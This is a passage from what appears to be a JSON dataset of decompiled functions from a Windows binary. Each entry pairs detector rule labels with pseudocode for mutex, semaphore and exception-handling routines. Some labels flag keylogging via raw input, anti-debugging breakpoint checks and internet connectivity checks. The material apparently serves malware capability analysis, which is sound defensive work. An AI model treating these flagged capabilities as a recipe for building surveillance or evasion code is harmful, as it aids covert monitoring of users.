-0x454e0ff3) {\n            uVar1 = 0;\n            piVar2[1] = piVar2[1] + 1;\n            goto code_r0x0041045e;\n        }\n    }\n    uVar1 = 0x16;\ncode_r0x0041045e:\n    if (*0x434a38 == 0) {\n        *0x434a38 = fcn.00410a00(\"mutex_global_shmem\", 0x10, 0x40fb30);\n    }\n    fcn.00410d10(*0x434a38);\n    return uVar1;\n}\n",
        "token_count": 630
    },
    "00410640": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint64_t fcn.00410640(int32_t **arg1, uint64_t arg2)\n\n{\n    uchar *arg2_00;\n    ulong *puVar1;\n    int32_t *piVar2;\n    code *pcVar3;\n    uint16_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    ulong uVar9;\n    uint64_t uVar10;\n    char *arg1_00;\n    int32_t *arg1_01;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    bool bVar13;\n    ulong auStack184 [5];\n    ulong uStack144;\n    ulong uStack136;\n    uint64_t auStack128 [2];\n    \n    uVar8 = fcn.00410410(arg1);\n    if (uVar8 != 0) {\n        return uVar8;\n    }\n    piVar2 = *arg1;\n    arg1_01 = piVar2;\n    if ((piVar2[2] == 0) || (iVar5 = piVar2[5],  iVar5 == 0)) {\ncode_r0x0041066c:\n        uVar9 = *(piVar2 + 6);\n        fcn.0040fec0(arg1_01, 0);\n        uVar8 = fcn.00412860(uVar9, 1, arg2 & 0xffffffff);\n        if (uVar8 != 0) {\n            return uVar8;\n        }\n        uVar8 = fcn.00410410(arg1);\n        if (uVar8 != 0) {\n            return uVar8;\n        }\n        piVar2[3] = 1;\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        piVar2[5] = iVar5;\n    }\n    else {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        if (iVar5 != iVar6) {\n            arg1_01 = *arg1;\n            goto code_r0x0041066c;\n        }\n        uVar12 = 0x24;\n        if (piVar2[2] != 2) goto code_r0x0040fec0;\n        LOCK();\n        piVar2[3] = piVar2[3] + 1;\n    }\n    uVar12 = 0;\ncode_r0x0040fec0:\n    uStack136 = *arg1;\n    auStack128[0] = uVar12;\n    if (*0x434a38 == 0) {\n        *0x434a38 = fcn.00410a00(\"mutex_global_shmem\", 0x10, 0x40fb30);\n    }\n    fcn.00410db0(*0x434a38);\n    iVar7 = *0x434a38;\n    if ((*uStack136 == -0x454e0ff3) && (0 < uStack136[1])) {\n        bVar13 = *0x434a38 == 0;\n        uStack136[1] = uStack136[1] + -1;\n        if (bVar13) {\n            *0x434a38 = fcn.00410a00(\"mutex_global_shmem\", 0x10, 0x40fb30);\n            fcn.00410d10(*0x434a38);\n            return auStack128[0];\n        }\n        fcn.00410d10(iVar7);\n        return auStack128[0];\n    }\n    iVar7 = (*_sym.imp.msvcrt.dll___iob_func)();\n    sub.msvcrt.dll_fprintf(iVar7 + 0x60, 0x42f208, \"(m_->valid == LIFE_MUTEX) && (m_->busy > 0)\");\n    sub.msvcrt.dll_exit(1);\n    arg1_00 = \"mutex_global_shmem\";\n    auStack184[0] = 0x410a26;\n    iVar5 = sub.msvcrt.dll_strlen();\n    auStack184[0] = 0x410a3e;\n    iVar7 = fcn.0040b810(arg1_00);\n    iVar7 = -iVar7;\n    arg2_00 = &stack0xffffffffffffff70 + iVar7;\n    *(&stack0xffffffffffffff70 + iVar7) = 0x656d68732d636367;\n    *(&stack0xffffffffffffff78 + iVar7) = 0x64742d6d;\n    *(&stack0xffffffffffffff7c + iVar7) = 0x326d;\n    uVar12 = iVar5 + 0x50;\n    (&stack0xffffffffffffff7e)[iVar7] = 0x2d;\n    *(&stack0xffffffffffffff48 + iVar7) = 0x410a86;\n    sub.msvcrt.dll_memcpy(&stack0xffffffffffffff7f + iVar7, \"mutex_global_shmem\", iVar5);\n    puVar1 = &stack0xffffffffffffff80 + iVar5 + iVar7;\n    *puVar1 = 0x6161616161616161;\n    puVar1[1] = 0x6161616161616161;\n    puVar1[2] = 0x6161616161616161;\n    puVar1[3] = 0x6161616161616161;\n    puVar1[4] = 0x6161616161616161;\n    puVar1[5] = 0x6161616161616161;\n    puVar1[6] = 0x6161616161616161;\n    puVar1[7] = 0x6161616161616161;\n    (&stack0xffffffffffffff70)[uVar12 + iVar7] = 0;\n    (&stack0xffffffffffffff70)[(iVar5 + 0xf) + iVar7] = 0;\n    *(&stack0xffffffffffffff48 + iVar7) = 0x410ace;\n    uVar9 = (*_sym.imp.KERNEL32.dll_CreateMutexA)(0, 0);\n    (&stack0xffffffffffffff70)[(iVar5 + 0xf) + iVar7] = 0x2d;\n    *(&stack0xffffffffffffff48 + iVar7) = 0x410ae4;\n    iVar6 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uVar9, 0xffffffff);\n    if (iVar6 != 0) {\n        pcVar3 = swi(3);\n        uVar8 = (*pcVar3)();\n        return uVar8;\n    }\n    *(&stack0xffffffffffffff48 + iVar7) = 0x410af2;\n    uVar4 = (*_sym.imp.KERNEL32.dll_FindAtomA)();\n    if (uVar4 == 0) {\n        *(&stack0xffffffffffffff48 + iVar7) = 0x410b07;\n        uVar10 = sub.msvcrt.dll_malloc(0x10);\n        uVar8 = 0x40;\n        do {\n            if ((uVar10 >> (uVar8 & 0x3f) & 1) != 0) {\n                arg2_00[uVar12 - uVar8] = 0x41;\n            }\n            uVar11 = uVar8 - 1;\n            uVar8 = uVar11;\n        } while (uVar11 != 0);\n        *(&stack0xffffffffffffff48 + iVar7) = 0x410b33;\n        uVar4 = (*_sym.imp.KERNEL32.dll_AddAtomA)();\n        if (uVar4 == 0) {\n            pcVar3 = swi(3);\n            uVar8 = (*pcVar3)();\n            return uVar8;\n        }\n        *(&stack0xffffffffffffff48 + iVar7) = 0x410b49;\n        uVar8 = fcn.00410980(uVar4, arg2_00, uVar12, iVar5 + 0x10);\n        if (uVar8 == uVar10) {\n            *(&stack0xffffffffffffff48 + iVar7) = 0x410ba6;\n            sub.msvcrt.dll_memset(uVar10, 0, 0x10);\n            *(&stack0xffffffffffffff48 + iVar7) = 0x410bb1;\n            (*0x40fb30)(uVar10);\n        }\n        else {\n            *(&stack0xffffffffffffff48 + iVar7) = 0x410b59;\n            sub.msvcrt.dll_free(uVar10);\n        }\n    }\n    else {\n        *(&stack0xffffffffffffff48 + iVar7) = 0x410b94;\n        uVar8 = fcn.00410980(uVar4, arg2_00, uVar12, iVar5 + 0x10);\n    }\n    *(&stack0xffffffffffffff48 + iVar7) = 0x410b62;\n    (*_sym.imp.KERNEL32.dll_ReleaseMutex)(uVar9);\n    *(&stack0xffffffffffffff48 + iVar7) = 0x410b6b;\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar9);\n    return uVar8;\n}\n",
        "token_count": 2012
    },
    "00410c00": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong fcn.00410c00(ulong *arg1, ulong arg2)\n\n{\n    uint *puVar1;\n    \n    if (arg1 != NULL) {\n        *arg1 = 0;\n        if (arg2 == 1) {\n            return 0x28;\n        }\n        if (arg2 < 2) {\n            puVar1 = sub.msvcrt.dll_calloc(1, 0x10);\n            if (puVar1 == NULL) {\n                return 0xc;\n            }\n            puVar1[3] = 1;\n            puVar1[2] = 0xfeedbab1;\n            puVar1[1] = 0;\n            *puVar1 = 0;\n            *arg1 = puVar1;\n            return 0;\n        }\n    }\n    return 0x16;\n}\n",
        "token_count": 184
    },
    "00412660": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nulong fcn.00412660(ulong *arg1, int32_t *arg2)\n\n{\n    code *pcVar1;\n    ulong uVar2;\n    uint *puVar3;\n    int64_t iVar4;\n    \n    uVar2 = 0x16;\n    if ((arg1 != NULL) && ((arg2 == NULL || (uVar2 = 0x28,  *arg2 != 1)))) {\n        puVar3 = sub.msvcrt.dll_calloc(1, 0xb0);\n        pcVar1 = _sym.imp.KERNEL32.dll_CreateSemaphoreA;\n        uVar2 = 0xc;\n        if (puVar3 != NULL) {\n            *puVar3 = 0xc0deadbf;\n            puVar3[2] = 0;\n            puVar3[4] = 0;\n            puVar3[3] = 0;\n            uVar2 = (*pcVar1)(0, 0, 0x7fffffff, 0);\n            *(puVar3 + 0x28) = uVar2;\n            iVar4 = (*pcVar1)(0, 0, 0x7fffffff, 0);\n            *(puVar3 + 0x2a) = iVar4;\n            pcVar1 = _sym.imp.KERNEL32.dll_InitializeCriticalSection;\n            if (*(puVar3 + 0x28) != 0) {\n                if (iVar4 != 0) {\n                    (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(puVar3 + 6);\n                    (*pcVar1)(puVar3 + 0x1c);\n                    (*pcVar1)(puVar3 + 0x10);\n                    puVar3[0x1a] = 0;\n                    puVar3[0x26] = 1;\n                    *puVar3 = 0xc0bab1fd;\n                    *arg1 = puVar3;\n                    return 0;\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)();\n                iVar4 = *(puVar3 + 0x2a);\n            }\n            if (iVar4 != 0) {\n                (*_sym.imp.KERNEL32.dll_CloseHandle)();\n            }\n            sub.msvcrt.dll_free(puVar3);\n            *arg1 = 0;\n            uVar2 = 0xb;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 518
    },
    "00412860": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint8_t fcn.00412860(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    ulong arg1_00;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    ulong uStack72;\n    int64_t iStack64;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_WaitForSingleObject;\n    if (arg2 == 1) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(arg1, arg3);\n        if (iVar2 == 0x80) {\n            uVar3 = 1;\n        }\n        else {\n            if (iVar2 != 0x102) {\n                return ~-(iVar2 == 0) & 0x16;\n            }\n            uVar3 = 0x8a;\n        }\n        iVar2 = (*pcVar1)(arg1, 0);\njoined_r0x0041295f:\n        if (iVar2 == 0) {\n            return 0;\n        }\n        return uVar3;\n    }\n    uStack72 = arg1;\n    arg1_00 = fcn.0040e680();\n    iStack64 = fcn.0040e6b0(arg1_00);\n    pcVar1 = _sym.imp.KERNEL32.dll_WaitForSingleObject;\n    if (iStack64 == 0) {\n        if (arg3 != 0xffffffff) {\n            uVar4 = 0x14;\n            do {\n                if (arg3 < uVar4) {\n                    uVar4 = arg3;\n                }\n                iVar2 = (*pcVar1)(arg1, uVar4);\n                if (iVar2 == 0x80) {\n                    uVar3 = 1;\n                }\n                else if (iVar2 == 0x102) {\n                    uVar3 = 0x8a;\n                }\n                else {\n                    if (iVar2 == 0) {\n                        uVar3 = 0;\n                        goto code_r0x00412a13;\n                    }\n                    uVar3 = 0x16;\n                }\n                arg3._0_4_ = arg3 - uVar4;\n                if (arg3 == 0) break;\n                iVar2 = fcn.0040e940();\n                if (iVar2 != 0) {\n                    return 0x16;\n                }\n            } while (uVar3 == 0x8a);\n            if (uVar3 == 0x8a) {\n                iVar2 = (*pcVar1)(arg1, 0);\n                if (iVar2 == 0) {\n                    return 0;\n                }\n            }\n            else {\ncode_r0x00412a13:\n                if (uVar3 == 0) {\n                    return 0;\n                }\n            }\n            if (arg2 == 2) {\n                return uVar3;\n            }\n            fcn.0040eac0();\n            return uVar3;\n        }\n        do {\n            iVar2 = (*pcVar1)(arg1, 0x28);\n            if (iVar2 == 0x80) {\n                uVar3 = 1;\ncode_r0x00412af9:\n                iVar2 = fcn.0040e940();\n                if (iVar2 == 0) {\n                    if (uVar3 == 0x16) {\n                        return 0x16;\n                    }\n                    iVar2 = (*pcVar1)(arg1, 0);\n                    goto joined_r0x0041295f;\n                }\n                break;\n            }\n            if (iVar2 != 0x102) {\n                uVar3 = 0x16;\n                if (iVar2 == 0) {\n                    return 0;\n                }\n                goto code_r0x00412af9;\n            }\n            iVar2 = fcn.0040e940();\n        } while (iVar2 == 0);\n        if (arg2 == 2) {\n            return 0x16;\n        }\ncode_r0x00412ab0:\n        fcn.0040eac0();\n        return 0x16;\n    }\n    while( true ) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(2, &uStack72, 0, arg3);\n        if (iVar2 != 1) break;\n        (*_sym.imp.KERNEL32.dll_ResetEvent)(iStack64);\n        if (arg2 != 2) goto code_r0x00412ab0;\n        fcn.0040eac0();\n    }\n    if (iVar2 == 0) {\n        return 0;\n    }\n    if (iVar2 == 0x80) {\n        uVar3 = 1;\n    }\n    else {\n        if (iVar2 != 0x102) {\n            uVar3 = 0x16;\n            goto code_r0x004128fa;\n        }\n        uVar3 = 0x8a;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uStack72);\n    if (iVar2 == 0) {\n        return 0;\n    }\ncode_r0x004128fa:\n    if ((arg2 != 2) && (iVar2 = fcn.0040e940(),  iVar2 != 0)) {\n        return 0x16;\n    }\n    return uVar3;\n}\n",
        "token_count": 1182
    },
    "00413700": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nulong fcn.00413700(int64_t arg1, int64_t arg2)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    ulong auStack16 [2];\n    \n    uVar1 = *(arg1 + 0x28);\n    if (uVar1 == 0xff) {\n        arg2 = 0;\n        goto code_r0x00413730;\n    }\n    uVar2 = uVar1 & 7;\n    if (uVar2 == 2) {\n        arg2 = arg2 * -2;\n        goto code_r0x00413730;\n    }\n    if (uVar2 < 3) {\n        if (uVar2 != 0) {\ncode_r0x00413754:\n            uVar1 = sub.msvcrt.dll_abort();\n            goto code_r0x00413760;\n        }\n    }\n    else {\n        if (uVar2 == 3) {\ncode_r0x00413760:\n            arg2 = arg2 * -4;\n            goto code_r0x00413730;\n        }\n        if (uVar2 != 4) goto code_r0x00413754;\n    }\n    arg2 = arg2 * -8;\ncode_r0x00413730:\n    fcn.00413a20(uVar1, *(arg1 + 0x10), arg2 + *(arg1 + 0x18), auStack16);\n    return auStack16[0];\n}\n",
        "token_count": 321
    },
    "00414400": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.00414400(void)\n\n{\n    char cVar1;\n    ulong *arg1;\n    int64_t *arg2;\n    ulong uVar2;\n    uint32_t in_R9D;\n    \n    arg1 = fcn.00414ab0(8);\n    uVar2 = 0x414210;\n    *arg1 = 0x42f8d0;\n    arg2 = 0x42f540;\n    fcn.00415220(arg1, 0x42f540, 0x414210);\n    cVar1 = fcn.004147e0(arg1, arg2);\n    if ((cVar1 == '\\0') && (in_R9D < 4)) {\n    // WARNING: Could not recover jumptable at 0x00414478. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(*arg2 + 0x28))(arg2, arg1, uVar2);\n        return;\n    }\n    return;\n}\n",
        "token_count": 222
    },
    "00414ba0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint64_t fcn.00414ba0(int64_t *arg1)\n\n{\n    int32_t iVar1;\n    ulong arg2;\n    ulong uVar2;\n    ulong *puVar3;\n    char cVar4;\n    int64_t **ppiVar5;\n    ulong arg1_00;\n    int64_t *piVar6;\n    uchar *arg3;\n    ulong *puVar7;\n    int64_t iVar8;\n    uchar auStack168 [16];\n    ulong uStack152;\n    int64_t *piStack120;\n    \n    ppiVar5 = fcn.00414fb0();\n    piStack120 = *ppiVar5;\n    piVar6 = arg1 + -10;\n    if (*arg1 + 0xb8b1aabcbcd4d500U < 2) {\n        iVar1 = *(arg1 + -5);\n        if (iVar1 < 0) {\n            iVar1 = -iVar1;\n        }\n        *(arg1 + -5) = iVar1 + 1;\n        *(ppiVar5 + 1) = *(ppiVar5 + 1) + -1;\n        if (piVar6 != piStack120) {\n            arg1[-6] = piStack120;\n            *ppiVar5 = piVar6;\n        }\n        return arg1[-1];\n    }\n    if (piStack120 == NULL) {\n        *ppiVar5 = piVar6;\n        return 0;\n    }\n    fcn.00414970();\n    if (piStack120 != NULL) {\n        fcn.00414ba0(piStack120);\n        if (*piStack120 + 0xb8b1aabcbcd4d500U < 2) goto code_r0x00414c5a;\n    }\n    fcn.00414970();\ncode_r0x00414c5a:\n    iVar8 = piStack120[-7];\n    fcn.00413b40();\n    fcn.00414ba0(iVar8);\n    uStack152 = *(iVar8 + -0x10);\n    arg2 = *(iVar8 + -0x18);\n    iVar1 = *(iVar8 + -0x24);\n    uVar2 = *(iVar8 + -0x38);\n    arg1_00 = fcn.00413b80(*(iVar8 + -0x40));\n    fcn.00414ba0(arg1_00);\n    piVar6 = fcn.004150e0();\n    puVar3 = *piVar6;\n    puVar7 = puVar3 + 0x12;\n    if ((*(puVar3 + 10) & 1) != 0) {\n        puVar7 = *puVar3;\n    }\n    arg3 = auStack168;\n    fcn.004137f0(0, arg2, arg3);\n    cVar4 = fcn.004138e0(arg3, puVar7[-0x12], puVar7, iVar1);\n    if (cVar4 != '\\0') {\n        arg3 = fcn.004151d0();\n        fcn.00414dd0();\n        fcn.00414dd0();\n        fcn.0040b420(arg3);\n    }\n    cVar4 = fcn.004138e0(arg3, 0x42f560, 0, iVar1);\n    if (cVar4 != '\\0') {\n        puVar7 = fcn.00414ab0(8);\n        *puVar7 = 0x42f910;\n        fcn.00415220(puVar7, 0x42f560, 0x414830);\n    }\n    fcn.00413b40(uVar2);\n    ppiVar5 = fcn.00414fb0();\n    piVar6 = *ppiVar5;\n    if (piVar6 == NULL) {\n        iVar8 = 0;\n    }\n    else {\n        if ((*(piVar6 + 10) & 1) != 0) {\n            piVar6 = *piVar6 + -0x90;\n        }\n        iVar8 = *piVar6;\n    }\n    return iVar8;\n}\n",
        "token_count": 906
    },
    "00414c30": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint64_t fcn.00414c30(int64_t *arg1)\n\n{\n    int32_t iVar1;\n    ulong arg2;\n    ulong uVar2;\n    ulong *puVar3;\n    char cVar4;\n    ulong arg1_00;\n    int64_t *piVar5;\n    uchar *arg3;\n    ulong *puVar6;\n    int64_t **ppiVar7;\n    int64_t iVar8;\n    uchar auStack128 [16];\n    ulong uStack112;\n    int64_t *piStack80;\n    \n    if (arg1 != NULL) {\n        fcn.00414ba0(arg1);\n        if (*arg1 + 0xb8b1aabcbcd4d500U < 2) goto code_r0x00414c5a;\n    }\n    fcn.00414970();\ncode_r0x00414c5a:\n    iVar8 = arg1[-7];\n    fcn.00413b40();\n    piStack80 = arg1;\n    fcn.00414ba0(iVar8);\n    uStack112 = *(iVar8 + -0x10);\n    arg2 = *(iVar8 + -0x18);\n    iVar1 = *(iVar8 + -0x24);\n    uVar2 = *(iVar8 + -0x38);\n    arg1_00 = fcn.00413b80(*(iVar8 + -0x40));\n    fcn.00414ba0(arg1_00);\n    piVar5 = fcn.004150e0();\n    puVar3 = *piVar5;\n    puVar6 = puVar3 + 0x12;\n    if ((*(puVar3 + 10) & 1) != 0) {\n        puVar6 = *puVar3;\n    }\n    arg3 = auStack128;\n    fcn.004137f0(0, arg2, arg3);\n    cVar4 = fcn.004138e0(arg3, puVar6[-0x12], puVar6, iVar1);\n    if (cVar4 != '\\0') {\n        arg3 = fcn.004151d0();\n        fcn.00414dd0();\n        fcn.00414dd0();\n        fcn.0040b420(arg3);\n    }\n    cVar4 = fcn.004138e0(arg3, 0x42f560, 0, iVar1);\n    if (cVar4 != '\\0') {\n        puVar6 = fcn.00414ab0(8);\n        *puVar6 = 0x42f910;\n        fcn.00415220(puVar6, 0x42f560, 0x414830);\n    }\n    fcn.00413b40(uVar2);\n    ppiVar7 = fcn.00414fb0();\n    piVar5 = *ppiVar7;\n    if (piVar5 == NULL) {\n        iVar8 = 0;\n    }\n    else {\n        if ((*(piVar5 + 10) & 1) != 0) {\n            piVar5 = *piVar5 + -0x90;\n        }\n        iVar8 = *piVar5;\n    }\n    return iVar8;\n}\n",
        "token_count": 704
    },
    "00414dd0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint64_t * fcn.00414dd0(void)\n\n{\n    uint8_t uVar1;\n    uint64_t *UNRECOVERED_JUMPTABLE;\n    uint64_t uVar2;\n    int64_t arg1;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    \n    UNRECOVERED_JUMPTABLE = fcn.004150e0();\n    uVar2 = *UNRECOVERED_JUMPTABLE;\n    if (uVar2 != 0) {\n        if (1 < *(uVar2 + 0x50) + 0xb8b1aabcbcd4d500U) {\n            *UNRECOVERED_JUMPTABLE = 0;\ncode_r0x0040b5a0:\n            UNRECOVERED_JUMPTABLE = *(uVar2 + 0x58);\n            if (UNRECOVERED_JUMPTABLE == NULL) {\n                return UNRECOVERED_JUMPTABLE;\n            }\n    // WARNING: Could not recover jumptable at 0x0040b5b1. Too many branches\n    // WARNING: Treating indirect jump as call\n            UNRECOVERED_JUMPTABLE = (*UNRECOVERED_JUMPTABLE)(1, uVar2 + 0x50);\n            return UNRECOVERED_JUMPTABLE;\n        }\n        iVar4 = *(uVar2 + 0x28);\n        if (iVar4 < 0) {\n            iVar4 = iVar4 + 1;\n            if (iVar4 == 0) {\n                *UNRECOVERED_JUMPTABLE = *(uVar2 + 0x20);\n            }\n        }\n        else {\n            iVar4 = iVar4 + -1;\n            if (iVar4 == 0) {\n                *UNRECOVERED_JUMPTABLE = *(uVar2 + 0x20);\n                goto code_r0x0040b5a0;\n            }\n            if (iVar4 == -1) {\n                fcn.00414970();\n                if ((0x429f1f < uVar2) && (uVar2 < 0x42c320)) {\n                    uVar3 = uVar2 - 0x429f20;\n                    iVar5 = SUB168(ZEXT416(uVar3) * ZEXT816(0xe38e38e38e38e38f) >> 0x40, 0);\n                    iVar4 = fcn.00410710(0x42c340);\n                    if (iVar4 != 0) {\n                        uVar2 = fcn.004143d0();\n                        goto code_r0x00414ed7;\n                    }\n                    uVar1 = uVar3 / 0x90 & 0x3f;\n                    *0x419f10 = *0x419f10 & (-2 << uVar1 | 0xfffffffffffffffeU >> 0x40 - uVar1);\n                    UNRECOVERED_JUMPTABLE = fcn.00410100(0x42c340);\n                    if (UNRECOVERED_JUMPTABLE == 0) {\n                        return UNRECOVERED_JUMPTABLE;\n                    }\n                    while( true ) {\n                        uVar2 = fcn.00414400();\ncode_r0x00414ed7:\n                        iVar5 = iVar5 + 1;\n                        if (iVar5 == 0) break;\n                        fcn.0040b420(uVar2);\n                    }\n                    fcn.00414c70(uVar2);\n                    if ((0x419f1f < uVar2) && (iVar5 = 0x429f20,  uVar2 < 0x429f20)) {\n                        iVar4 = fcn.00410710(0x42c340);\n                        if (iVar4 != 0) {\n                            arg1 = fcn.004143d0();\n                            goto code_r0x00414f76;\n                        }\n                        uVar1 = uVar2 - 0x419f20U >> 10 & 0x3f;\n                        *0x419f00 = *0x419f00 & (-2 << uVar1 | 0xfffffffffffffffeU >> 0x40 - uVar1);\n                        UNRECOVERED_JUMPTABLE = fcn.00410100(0x42c340);\n                        if (UNRECOVERED_JUMPTABLE != 0) {\n                            while( true ) {\n                                arg1 = fcn.00414400();\ncode_r0x00414f76:\n                                iVar5 = iVar5 + 1;\n                                if (iVar5 == 0) break;\n                                fcn.0040b420(arg1);\n                            }\n                            fcn.00414c70(arg1);\n                            return *(arg1 + -8);\n                        }\n                        return UNRECOVERED_JUMPTABLE;\n                    }\n                }\n    // WARNING: Could not recover jumptable at 0x0040b8e0. Too many branches\n    // WARNING: Treating indirect jump as call\n                UNRECOVERED_JUMPTABLE = (*_sym.imp.msvcrt.dll_free)();\n                return UNRECOVERED_JUMPTABLE;\n            }\n        }\n        *(uVar2 + 0x28) = iVar4;\n    }\n    return UNRECOVERED_JUMPTABLE;\n}\n",
        "token_count": 1161
    },
    "00414fb0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong * fcn.00414fb0(void)\n\n{\n    int32_t iVar1;\n    ulong *arg2;\n    \n    if (*0x42c390 == NULL) {\n        *0x42c390 = fcn.0040b650(\"init\", 8, 0x415310);\n    }\n    if (*(*0x42c390 + 1) == '\\0') {\n        arg2 = *0x42c380;\n        if (*0x42c380 == NULL) {\n            arg2 = fcn.0040b650(\"eh_globals\", 0x10, 0);\n            *0x42c380 = arg2;\n        }\n    }\n    else {\n        if (*0x42c390 == NULL) {\n            *0x42c390 = fcn.0040b650(\"init\", 8, 0x415310);\n        }\n        arg2 = fcn.0040e4e0(**0x42c390);\n        if (arg2 == NULL) {\n            arg2 = sub.msvcrt.dll_malloc();\n            if (arg2 == NULL) goto code_r0x004150a4;\n            if (*0x42c390 == NULL) goto code_r0x004150a9;\n            while( true ) {\n                iVar1 = fcn.0040e550(**0x42c390, arg2);\n                if (iVar1 == 0) break;\ncode_r0x004150a4:\n                fcn.00414970();\ncode_r0x004150a9:\n                *0x42c390 = fcn.0040b650(\"init\", 8, 0x415310);\n            }\n            *arg2 = 0;\n            *(arg2 + 1) = 0;\n        }\n    }\n    return arg2;\n}\n",
        "token_count": 393
    },
    "004150e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.004150e0(void)\n\n{\n    if (*0x42c390 == NULL) {\n        *0x42c390 = fcn.0040b650(\"init\", 8, 0x415310);\n    }\n    if (*(*0x42c390 + 1) == '\\0') {\n        if (*0x42c380 == 0) {\n            *0x42c380 = fcn.0040b650(\"eh_globals\", 0x10, 0);\n        }\n    }\n    else {\n        if (*0x42c390 == NULL) {\n            *0x42c390 = fcn.0040b650(\"init\", 8, 0x415310);\n        }\n        fcn.0040e4e0(**0x42c390);\n    }\n    return;\n}\n",
        "token_count": 182
    },
    "004151d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004151d0(void)\n\n{\n    int64_t *piVar1;\n    int64_t arg1;\n    \n    piVar1 = fcn.00414fb0();\n    arg1 = *piVar1;\n    *(piVar1 + 1) = *(piVar1 + 1) + 1;\n    if (arg1 == 0) goto code_r0x00415215;\n    if (*(arg1 + 0x50) + 0xb8b1aabcbcd4d500U < 2) goto code_r0x0041521a;\n    *piVar1 = 0;\n    do {\n        arg1 = arg1 + 0x50;\n        fcn.0040b4d0(arg1);\n        fcn.00414ba0(arg1);\ncode_r0x00415215:\n        fcn.00414970();\ncode_r0x0041521a:\n        *(arg1 + 0x28) = -*(arg1 + 0x28);\n    } while( true );\n}\n",
        "token_count": 231
    },
    "0040b360": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
